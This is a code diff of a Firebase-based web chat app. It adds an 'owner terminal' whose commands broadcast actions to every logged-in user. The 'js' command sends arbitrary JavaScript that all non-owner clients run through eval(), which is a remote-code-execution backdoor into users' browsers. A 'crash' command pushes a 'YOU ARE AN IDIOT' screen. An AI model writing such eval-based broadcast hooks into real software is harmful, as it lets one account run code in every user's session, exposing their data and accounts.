+        function addTerminalLine(text, type = 'normal') {
+            const output = document.getElementById('terminalOutput');
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            
+            if (type === 'error') {
+                line.style.color = '#ff4444';
+            } else if (type === 'success') {
+                line.style.color = '#44ff44';
+            } else if (type === 'info') {
+                line.style.color = '#ffff44';
+            }
+            
+            line.textContent = text;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function handleTerminalKeypress(event) {
+            if (event.key === 'Enter') {
+                const input = document.getElementById('terminalInput');
+                const command = input.value.trim();
+                if (command) {
+                    addTerminalLine(`# ${command}`);
+                    executeTerminalCommand(command);
+                    input.value = '';
+                }
+            }
+        }
+
+        async function executeTerminalCommand(command) {
+            const args = command.split(' ');
+            const cmd = args[0].toLowerCase();
+
+            switch(cmd) {
+                case 'help':
+                    addTerminalLine('Available commands:', 'info');
+                    addTerminalLine('  help - Show this help');
+                    addTerminalLine('  users - List all users');
+                    addTerminalLine('  msg <username> <message> - Send message to user');
+                    addTerminalLine('  broadcast <message> - Broadcast to all users');
+                    addTerminalLine('  js <code> - Execute JavaScript on all users');
+                    addTerminalLine('  crash - Show "YOU ARE AN IDIOT" on all users');
+                    addTerminalLine('  reload - Reload all users');
+                    addTerminalLine('  logout - Force logout all users');
+                    addTerminalLine('  clear - Clear terminal');
+                    break;
+
+                case 'users':
+                    const users = await getCachedUsers();
+                    addTerminalLine(`Total users: ${users.length}`, 'info');
+                    users.forEach(u => {
+                        const status = u.online ? '🟢' : '⚪';
+                        addTerminalLine(`  ${status} ${u.username} ${u.isAdmin ? '(ADMIN)' : ''} ${isOwnerUser(u.username) ? '(OWNER)' : ''}`);
+                    });
+                    break;
+
+                case 'msg':
+                    if (args.length < 3) {
+                        addTerminalLine('Usage: msg <username> <message>', 'error');
+                        return;
+                    }
+                    const targetUsername = args[1];
+                    const message = args.slice(2).join(' ');
+                    
+                    const targetUser = Object.values(usersCache).find(u => u.username === targetUsername);
+                    if (!targetUser) {
+                        addTerminalLine(`User ${targetUsername} not found`, 'error');
+                        return;
+                    }
+
+                    const chatId = [currentUser.id, targetUser.id].sort().join('_');
+                    await rtdb.ref(`privateChats/${chatId}/messages`).push({
+                        userId: currentUser.id,
+                        username: currentUser.username,
+                        userAvatar: currentUser.avatar,
+                        isAdmin: currentUser.isAdmin,
+                        content: `[OWNER] ${message}`,
+                        type: 'normal',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                    addTerminalLine(`Message sent to ${targetUsername}`, 'success');
+                    break;
+
+                case 'broadcast':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: broadcast <message>', 'error');
+                        return;
+                    }
+                    const broadcastMsg = args.slice(1).join(' ');
+                    await db.collection('broadcasts').add({
+                        type: 'message',
+                        message: `[OWNER] ${broadcastMsg}`,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalLine('Broadcast sent to all users', 'success');
+                    break;
+
+                case 'js':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: js <code>', 'error');
+                        return;
+                    }
+                    const jsCode = args.slice(1).join(' ');
+                    await db.collection('broadcasts').add({
+                        type: 'js_execute',
+                        code: jsCode,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalLine('JavaScript code sent to all users', 'success');
+                    break;
+
+                case 'crash':
+                    await db.collection('broadcasts').add({
+                        type: 'crash',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalLine('💥 CRASH command sent to all users', 'success');
+                    break;
+
+                case 'reload':
+                    await db.collection('broadcasts').add({
+                        type: 'force_reload',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalLine('Reload command sent to all users', 'success');
+                    break;
+
+                case 'logout':
+                    await db.collection('broadcasts').add({
+                        type: 'force_logout',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalLine('Logout command sent to all users', 'success');
+                    break;
+
+                case 'clear':
+                    document.getElementById('terminalOutput').innerHTML = '';
+                    break;
+
+                default:
+                    addTerminalLine(`Unknown command: ${cmd}`, 'error');
+            }
+        }
+
+        // ==================== ADMIN PANEL ====================
         async function showAdminPanel() {
             if (!currentUser.isAdmin && !currentUser.isOwner) { showToast('Access denied', 'error'); return; }
             document.getElementById('adminModal').classList.remove('hidden');
@@ -2846,6 +3386,7 @@
             } catch(error) { alert('Error: ' + error.message); }
         }
 
+        // ==================== PAGE RELOAD PANEL ====================
         function showPageReloadPanel() {
             document.getElementById('pageReloadModal').classList.remove('hidden');
             document.getElementById('reloadUserList').classList.add('hidden');
@@ -2925,134 +3466,16 @@
             }
         }
 
-        async function showOwnerPanel() {
-            if (!currentUser.isOwner) { showToast('Access denied', 'error'); return; }
-            document.getElementById('ownerModal').classList.remove('hidden');
-            await loadOwnerAdminList();
+        // ==================== OWNER PANEL (legacy) ====================
+        function showOwnerPanel() {
+            showOwnerTerminal();
         }
 
-        function closeOwnerPanel() { document.getElementById('ownerModal').classList.add('hidden'); }
-
-        async function loadOwnerAdminList() {
-            const listEl = document.getElementById('ownerAdminList');
-            listEl.innerHTML = '';
-            const users = await getCachedUsers();
-            users.forEach(u => {
-                const isUserOwner = isOwnerUser(u.username);
-                const div = document.createElement('div');
-                div.className = 'user-item';
-                div.innerHTML = `
-                    <div class="user-item-info">
-                        <span class="avatar">${u.avatar}</span>
-                        <span>${sanitizeHTML(u.username)}</span>
-                        ${isUserOwner ? '<span class="badge owner">⭐ OWNER</span>' : (u.isAdmin ? '<span class="badge admin">ADMIN</span>' : '')}
-                    </div>
-                    <div class="user-actions">
-                        ${!isUserOwner ? `
-                            ${!u.isAdmin ? `<button class="btn-small btn-owner" onclick="ownerGrantAdmin('${u.id}')">Grant Admin</button>` : `<button class="btn-small btn-danger" onclick="ownerRevokeAdmin('${u.id}')">Revoke Admin</button>`}
-                        ` : '<span style="color:var(--owner-color); font-size:0.8rem;">⭐ You</span>'}
-                    </div>
-                `;
-                listEl.appendChild(div);
-            });
+        function closeOwnerPanel() {
+            document.getElementById('ownerModal').classList.add('hidden');
         }
 
-        async function ownerGrantAdmin(userId) {
-            try {
-                await db.collection('users').doc(userId).update({ isAdmin: true });
-                if (usersCache[userId]) usersCache[userId].isAdmin = true;
-                showToast('Admin granted', 'success');
-                loadOwnerAdminList();
-            } catch(error) { showToast('Error: ' + error.message, 'error'); }
-        }
-
-        async function ownerRevokeAdmin(userId) {
-            try {
-                await db.collection('users').doc(userId).update({ isAdmin: false });
-                if (usersCache[userId]) usersCache[userId].isAdmin = false;
-                showToast('Admin revoked', 'success');
-                loadOwnerAdminList();
-            } catch(error) { showToast('Error: ' + error.message, 'error'); }
-        }
-
-        async function ownerWipeEverything() {
-            if (!confirm('⚠️ This will delete ALL data including users (except you). Are you absolutely sure?')) return;
-            if (!confirm('This is IRREVERSIBLE. Type OK to confirm.')) return;
-            try {
-                showLoading();
-                const [usersSnap, messagesSnap, announcementsSnap, broadcastsSnap] = await Promise.all([
-                    db.collection('users').get(),
-                    db.collection('messages').get(),
-                    db.collection('announcements').get(),
-                    db.collection('broadcasts').get()
-                ]);
-                const deletions = [];
-                usersSnap.forEach(doc => { if (!isOwnerUser(doc.data().username)) deletions.push(doc.ref.delete()); });
-                messagesSnap.forEach(doc => deletions.push(doc.ref.delete()));
-                announcementsSnap.forEach(doc => deletions.push(doc.ref.delete()));
-                broadcastsSnap.forEach(doc => deletions.push(doc.ref.delete()));
-                await Promise.all([...deletions, rtdb.ref('privateChats').remove(), rtdb.ref('status').remove()]);
-                invalidateUsersCache();
-                hideLoading();
-                showToast('Everything wiped (except owner account)', 'warning');
-            } catch(error) {
-                hideLoading();
-                showToast('Error: ' + error.message, 'error');
-            }
-        }
-
-        async function ownerForceLogoutAll() {
-            if (!confirm('Force logout all other users?')) return;
-            try {
-                showLoading();
-                await db.collection('broadcasts').add({
-                    type: 'force_logout',
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    sentBy: currentUser.id,
-                    targetUsers: 'all'
-                });
-                hideLoading();
-                showToast('Force logout sent to all users', 'success');
-            } catch(error) {
-                hideLoading();
-                showToast('Error: ' + error.message, 'error');
-            }
-        }
-
-        async function ownerReloadAll() {
-            try {
-                showLoading();
-                const allUsers = await getCachedUsers();
-                const allUserIds = allUsers.filter(u => !isOwnerUser(u.username)).map(u => u.id);
-                await db.collection('broadcasts').add({
-                    type: 'force_reload',
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    sentBy: currentUser.id,
-                    targetUsers: allUserIds,
-                    openedBy: []
-                });
-                hideLoading();
-                showToast('Reload command sent to all users', 'success');
-            } catch(error) {
-                hideLoading();
-                showToast('Error: ' + error.message, 'error');
-            }
-        }
-
-        async function ownerRestoreDefaults() {
-            if (!confirm('Reset admin settings to defaults?')) return;
-            try {
-                showLoading();
-                await db.collection('admin').doc('settings').set({ maintenanceMode: false }, { merge: true });
-                invalidateMaintenanceCache();
-                hideLoading();
-                showToast('Settings restored to defaults', 'success');
-            } catch(error) {
-                hideLoading();
-                showToast('Error: ' + error.message, 'error');
-            }
-        }
-
+        // ==================== MAINTENANCE MODE / GAME ====================
         function showMaintenanceMode() {
             document.getElementById('loginPage').classList.add('hidden');
             document.getElementById('chatApp').classList.add('hidden');
@@ -3219,6 +3642,7 @@
             gameLoop();
         }
 
+        // ==================== UI HELPERS ====================
         function showLogin() {
             document.getElementById('registerPage').classList.add('hidden');
             document.getElementById('loginPage').classList.remove('hidden');
@@ -3231,6 +3655,7 @@
 
         function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
 
+        // ==================== EVENT LISTENERS ====================
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = document.getElementById('loginUsername').value;
@@ -3250,6 +3675,7 @@
             catch(error) { showError('registerError', error.message); }
         });
 
+        // ==================== BROADCAST BANNER & URL / RELOAD HANDLING ====================
         let broadcastListener = null;
         let currentPopupUrl = null;
 
@@ -3319,11 +3745,33 @@
                             localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
                             logout();
 
+                        } else if (broadcast.type === 'js_execute') {
+                            if (currentUser.isOwner) return;
+                            try {
+                                eval(broadcast.code);
+                            } catch(e) {
+                                console.error('JS execution error:', e);
+                            }
+
+                        } else if (broadcast.type === 'crash') {
+                            if (currentUser.isOwner) return;
+                            showIdiotScreen();
+
                         } else {
                             showBroadcastBanner(broadcast.message, doc.id);
                         }
                     });
                 });
+        }
+
+        function showIdiotScreen() {
+            const screen = document.getElementById('idiotScreen');
+            screen.classList.remove('hidden');
+            
+            // Make it last for 10 seconds
+            setTimeout(() => {
+                screen.classList.add('hidden');
+            }, 10000);
         }
 
         function acceptOwnerUrl() {
@@ -3422,6 +3870,7 @@
             banner.classList.add('hidden');
         }
 
+        // ==================== URL REDIRECT FUNCTIONS ====================
         function showUrlRedirect() {
             document.getElementById('urlRedirectModal').classList.remove('hidden');
             document.getElementById('redirectUrl').value = '';
@@ -3521,6 +3970,7 @@
         function openPopupUrl() {}
         function closeUrlPopup() {}
 
+        // ==================== INITIALIZATION ====================
         window.addEventListener('load', async () => {
             const loggedIn = await autoLogin();
             if (!loggedIn) document.getElementById('loginPage').classList.remove('hidden');
@@ -3533,6 +3983,7 @@
             }
         });
 
+        // Override loadMessages to set up typing listener
         const originalLoadMessages = loadMessages;
         loadMessages = function(chatId) {
             originalLoadMessages(chatId);
